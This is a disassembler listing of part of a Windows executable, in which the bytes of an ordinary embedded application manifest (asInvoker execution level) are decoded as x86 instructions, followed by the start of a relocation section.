  4044a8:	outs   dx,BYTE PTR ds:[esi]
  4044a9:	gs cmp eax,0x73657922
  4044af:	and    bh,BYTE PTR [edi]
  4044b1:	ds or  eax,0x73613c0a
  4044b7:	jae    0x40451e
  4044b9:	ins    DWORD PTR es:[edi],dx
  4044ba:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4044be:	js     0x40452d
  4044c0:	ins    BYTE PTR es:[edi],dx
  4044c1:	outs   dx,BYTE PTR ds:[esi]
  4044c2:	jae    0x404501
  4044c4:	and    dh,BYTE PTR [ebp+0x72]
  4044c7:	outs   dx,BYTE PTR ds:[esi]
  4044c8:	cmp    dh,BYTE PTR [ebx+0x63]
  4044cb:	push   0x73616d65
  4044d0:	sub    eax,0x7263696d
  4044d5:	outs   dx,DWORD PTR ds:[esi]
  4044d6:	jae    0x404547
  4044d8:	data16 je 0x404508
  4044db:	arpl   WORD PTR [edi+0x6d],bp
  4044de:	cmp    ah,BYTE PTR [ecx+0x73]
  4044e1:	ins    DWORD PTR es:[edi],dx
  4044e2:	cs jbe 0x404516
  4044e5:	and    ah,BYTE PTR [eax]
  4044e7:	ins    DWORD PTR es:[edi],dx
  4044e8:	popa   
  4044e9:	outs   dx,BYTE PTR ds:[esi]
  4044ea:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4044f1:	jb     0x404566
  4044f3:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4044fa:	xor    BYTE PTR [edx],ah
  4044fc:	ds or  eax,0x3c20200a
  404502:	popa   
  404503:	jae    0x404578
  404505:	gs ins DWORD PTR es:[edi],dx
  404507:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40450b:	fs outs dx,BYTE PTR gs:[esi]
  40450e:	je     0x404579
  404510:	je     0x40458b
  404512:	and    BYTE PTR [esi+0x65],dh
  404515:	jb     0x40458a
  404517:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40451e:	xor    BYTE PTR [esi],ch
  404520:	xor    BYTE PTR [esi],ch
  404522:	xor    BYTE PTR [edx],ah
  404524:	and    BYTE PTR [esi+0x61],ch
  404527:	ins    DWORD PTR es:[edi],dx
  404528:	gs cmp eax,0x41794d22
  40452e:	jo     0x4045a0
  404530:	ins    BYTE PTR es:[edi],dx
  404531:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404538:	cs popa 
  40453a:	jo     0x4045ac
  40453c:	and    ch,BYTE PTR [edi]
  40453e:	ds or  eax,0x3c20200a
  404544:	je     0x4045b8
  404546:	jne    0x4045bb
  404548:	je     0x404593
  40454a:	outs   dx,BYTE PTR ds:[esi]
  40454b:	outs   dx,WORD PTR ds:[esi]
  40454d:	and    BYTE PTR [eax+0x6d],bh
  404550:	ins    BYTE PTR es:[edi],dx
  404551:	outs   dx,BYTE PTR ds:[esi]
  404552:	jae    0x404591
  404554:	and    dh,BYTE PTR [ebp+0x72]
  404557:	outs   dx,BYTE PTR ds:[esi]
  404558:	cmp    dh,BYTE PTR [ebx+0x63]
  40455b:	push   0x73616d65
  404560:	sub    eax,0x7263696d
  404565:	outs   dx,DWORD PTR ds:[esi]
  404566:	jae    0x4045d7
  404568:	data16 je 0x404598
  40456b:	arpl   WORD PTR [edi+0x6d],bp
  40456e:	cmp    ah,BYTE PTR [ecx+0x73]
  404571:	ins    DWORD PTR es:[edi],dx
  404572:	cs jbe 0x4045a7
  404575:	and    bh,BYTE PTR [esi]
  404577:	or     eax,0x2020200a
  40457c:	and    BYTE PTR [ebx+esi*2],bh
  40457f:	arpl   WORD PTR gs:[ebp+0x72],si
  404583:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40458b:	and    BYTE PTR [eax],ah
  40458d:	and    BYTE PTR [eax],ah
  40458f:	cmp    al,0x72
  404591:	gs jno 0x404609
  404594:	gs jae 0x40460b
  404597:	gs fs push eax
  40459a:	jb     0x404605
  40459c:	jbe    0x404607
  40459e:	ins    BYTE PTR es:[edi],dx
  40459f:	gs addr16 gs jae 0x4045c4
  4045a4:	js     0x404613
  4045a6:	ins    BYTE PTR es:[edi],dx
  4045a7:	outs   dx,BYTE PTR ds:[esi]
  4045a8:	jae    0x4045e7
  4045aa:	and    dh,BYTE PTR [ebp+0x72]
  4045ad:	outs   dx,BYTE PTR ds:[esi]
  4045ae:	cmp    dh,BYTE PTR [ebx+0x63]
  4045b1:	push   0x73616d65
  4045b6:	sub    eax,0x7263696d
  4045bb:	outs   dx,DWORD PTR ds:[esi]
  4045bc:	jae    0x40462d
  4045be:	data16 je 0x4045ee
  4045c1:	arpl   WORD PTR [edi+0x6d],bp
  4045c4:	cmp    ah,BYTE PTR [ecx+0x73]
  4045c7:	ins    DWORD PTR es:[edi],dx
  4045c8:	cs jbe 0x4045fe
  4045cb:	and    bh,BYTE PTR [esi]
  4045cd:	or     eax,0x2020200a
  4045d2:	and    BYTE PTR [eax],ah
  4045d4:	and    BYTE PTR [eax],ah
  4045d6:	and    BYTE PTR [edx+esi*2],bh
  4045d9:	gs jno 0x404651
  4045dc:	gs jae 0x404653
  4045df:	gs fs inc ebp
  4045e2:	js     0x404649
  4045e4:	arpl   WORD PTR [ebp+0x74],si
  4045e7:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4045ee:	ins    BYTE PTR es:[edi],dx
  4045ef:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4045f3:	gs ins BYTE PTR es:[edi],dx
  4045f5:	cmp    eax,0x49736122
  4045fa:	outs   dx,BYTE PTR ds:[esi]
  4045fb:	jbe    0x40466c
  4045fd:	imul   esp,DWORD PTR [ebp+0x72],0x22
  404601:	and    BYTE PTR [ebp+0x69],dh
  404604:	inc    ecx
  404605:	arpl   WORD PTR [ebx+0x65],sp
  404608:	jae    0x40467d
  40460a:	cmp    eax,0x6c616622
  40460f:	jae    0x404676
  404611:	and    ch,BYTE PTR [edi]
  404613:	ds or  eax,0x2020200a
  404619:	and    BYTE PTR [eax],ah
  40461b:	and    BYTE PTR [edi+ebp*1],bh
  40461e:	jb     0x404685
  404620:	jno    0x404697
  404622:	gs jae 0x404699
  404625:	gs fs push eax
  404628:	jb     0x404693
  40462a:	jbe    0x404695
  40462c:	ins    BYTE PTR es:[edi],dx
  40462d:	gs addr16 gs jae 0x404670
  404632:	or     eax,0x2020200a
  404637:	and    BYTE PTR [edi+ebp*1],bh
  40463a:	jae    0x4046a1
  40463c:	arpl   WORD PTR [ebp+0x72],si
  40463f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404647:	cmp    al,0x2f
  404649:	je     0x4046bd
  40464b:	jne    0x4046c0
  40464d:	je     0x404698
  40464f:	outs   dx,BYTE PTR ds:[esi]
  404650:	outs   dx,WORD PTR ds:[esi]
  404652:	ds or  eax,0x612f3c0a
  404658:	jae    0x4046cd
  40465a:	gs ins DWORD PTR es:[edi],dx
  40465c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404660:	or     eax,0xa
  404665:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00406000 <.reloc>:
  406000:	add    BYTE PTR [eax],dh
  406002:	add    BYTE PTR [eax],al
  406004:	or     al,0x0
  406006:	add    BYTE PTR [eax],al
  406008:	adc    BYTE PTR [edi],bh
	...
